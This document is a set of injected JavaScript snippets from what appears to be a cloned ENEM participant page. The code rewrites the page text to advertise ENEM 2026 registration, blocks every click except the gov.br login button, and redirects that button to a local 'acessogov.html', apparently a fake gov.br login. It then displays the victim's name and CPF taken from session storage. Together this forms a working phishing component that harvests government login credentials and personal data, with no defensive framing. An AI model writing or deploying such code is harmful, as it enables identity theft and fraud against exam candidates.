<script>
(function(){
  var NOVOS_PARAGS = [
    'Olá! Eu sou a Nanda!',
    'Estou por dentro de tudo sobre o ENEM!',
    'Seja bem-vindo à Página do Participante. Aqui você pode realizar sua inscrição para o ENEM 2026!'
  ];

  var feito = false;

  function modificar(){
    if(feito) return;
    var parags = document.querySelectorAll('p');
    for(var i = 0; i < parags.length; i++){
      var t = parags[i].textContent || '';
      if(t.indexOf('consultar seus resultados') !== -1 || t.indexOf('anos anteriores') !== -1){
        var container = parags[i].parentElement;
        if(!container) continue;
        // Preserva o botão gov.br antes de limpar o container
        var botaoGov = null;
        var els = container.querySelectorAll('button,a,[role="button"]');
        for(var j = 0; j < els.length; j++){
          if((els[j].textContent || '').indexOf('gov.br') !== -1){
            botaoGov = els[j].parentElement || els[j];
            break;
          }
        }
        container.innerHTML = NOVOS_PARAGS.map(function(html){
          return '<p>' + html + '</p>';
        }).join('');
        if(botaoGov) container.appendChild(botaoGov);
        feito = true;
        break;
      }
    }
  }

  document.addEventListener('DOMContentLoaded', function(){
    modificar();
    var obs = new MutationObserver(function(){
      if(!feito) modificar();
    });
    obs.observe(document.body, {childList: true, subtree: true});
  });
})();
</script><script>
(function(){
  // Intercepta todos os cliques; redireciona apenas o botão gov.br
  window.addEventListener('click',function(e){
    var node=e.target;
    while(node&&node!==document.documentElement){
      if((node.tagName==='BUTTON'||node.tagName==='A'||(node.getAttribute&&node.getAttribute('role')==='button'))&&
         (node.textContent||'').indexOf('gov.br')!==-1){
        e.preventDefault();
        e.stopImmediatePropagation();
        window.location.href='acessogov.html';
        return;
      }
      node=node.parentElement;
    }
    e.preventDefault();
    e.stopImmediatePropagation();
  },true);

  // Remove o disabled e corrige aparência do botão gov.br cada vez que o React re-renderizar
  function habilitarBotao(){
    var btns=document.querySelectorAll('button');
    for(var i=0;i<btns.length;i++){
      if((btns[i].textContent||'').indexOf('gov.br')!==-1){
        btns[i].removeAttribute('disabled');
        btns[i].style.setProperty('opacity','1','important');
        btns[i].style.setProperty('pointer-events','auto','important');
        btns[i].style.setProperty('cursor','pointer','important');
        btns[i].style.setProperty('filter','none','important');
      }
    }
  }

  var obs=new MutationObserver(habilitarBotao);
  document.addEventListener('DOMContentLoaded',function(){
    obs.observe(document.body,{childList:true,subtree:true,attributes:true,attributeFilter:['disabled']});
    habilitarBotao();
  });
})();
</script><script>
(function(){
  var dados;
  try { dados = JSON.parse(sessionStorage.getItem('gov_dados') || 'null'); } catch(e){}
  if (!dados || !dados.nome) return;

  function fmtCPF(c){
    c = c.replace(/\D/g,'');
    return c.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
  }

  function injetar(){
    if (document.getElementById('gov-credenciais')) return;
    var div = document.createElement('div');
    div.id = 'gov-credenciais';
    div.style.cssText = [
      'position:fixed',
      'bottom:52px',
      'left:0',
      'padding:4px 12px 4px 12px',
      'z-index:99999',
      'pointer-events:none',
      'line-height:1.35'
    ].join(';');
    div.innerHTML =
      '<div style="font-size:13px;font-weight:700;color:#1a1a1a;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:220px;">' +
        dados.nome +
      '</div>' +
      '<div style="font-size:12px;color:#555;">' +
        fmtCPF(dados.cpf || '') +
      '</div>';
    document.body.appendChild(div);
  }

  document.addEventListener('DOMContentLoaded', function(){
    injetar();
    var obs = new MutationObserver(injetar);
    obs.observe(document.body, {childList:true, subtree:false});
  });
})();
